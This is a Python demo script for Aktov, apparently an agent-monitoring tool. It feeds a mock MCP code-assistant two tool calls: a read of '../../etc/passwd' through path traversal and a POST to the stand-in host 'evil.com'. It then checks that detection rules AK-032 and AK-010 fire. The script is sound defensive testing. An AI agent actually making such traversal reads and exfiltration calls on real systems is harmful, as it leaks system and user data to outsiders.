"""Demo: MCP Path Traversal + Exfiltration Detection (AK-032 + AK-010).

Scenario: An MCP code assistant reads /etc/passwd via path traversal,
then sends data to an external URL. Aktov detects both the path
traversal and the read-then-exfil pattern.

Expected detections:
  - AK-032 (path_traversal_detected)
  - AK-010 (read_then_external_network_egress)
"""

from __future__ import annotations

import asyncio
import sys
import os

sys.path.insert(0, os.path.dirname(__file__))

from _output import banner, scenario, step, results, explainer

from aktov.integrations.mcp import wrap


class MockMCPClient:
    """A mock MCP client that simulates call_tool responses."""

    async def call_tool(self, name: str, arguments: dict | None = None) -> dict:
        return {"content": [{"type": "text", "text": f"Result of {name}"}]}


async def _run() -> dict:
    banner(
        "MCP — Path Traversal + Exfiltration Detection",
        "Detects directory traversal and read-then-exfil pattern",
    )

    scenario(
        "A code assistant MCP agent reads /etc/passwd using path traversal, "
        "then sends data to an external URL."
    )

    # ── Set up Aktov MCP wrapper ──
    client = MockMCPClient()
    traced = wrap(client, aktov_agent_name="code-assistant")

    # ── Tool call 1: read file with path traversal ──
    step("read_file", 'path="../../etc/passwd"')
    await traced.call_tool("read_file", {"path": "../../etc/passwd"})

    # ── Tool call 2: send data to external URL ──
    step("http_request", 'url="https://evil.com/data", method="POST"')
    await traced.call_tool("http_request", {"url": "https://evil.com/data", "method": "POST"})

    # ── End trace and show results ──
    response = traced.end_trace()
    results(response)

    explainer(
        "AK-032 fires because the read_file argument contains '../' path traversal. "
        "AK-010 fires because a 'read' tool was followed by an external 'network' tool. "
        "Together, these catch a classic 'read sensitive file, then exfiltrate' attack."
    )

    rule_ids = [a["rule_id"] for a in response.alerts]
    return {"rule_ids": rule_ids, "response": response}


def run() -> dict:
    """Synchronous entry point."""
    return asyncio.run(_run())


if __name__ == "__main__":
    result = run()
    rule_ids = result["rule_ids"]
    ok = "AK-032" in rule_ids and "AK-010" in rule_ids
    if ok:
        print("  Demo passed: AK-032 + AK-010 detected.")
    else:
        print(f"  Demo FAILED: expected AK-032 + AK-010, got {rule_ids}", file=sys.stderr)
        sys.exit(1)
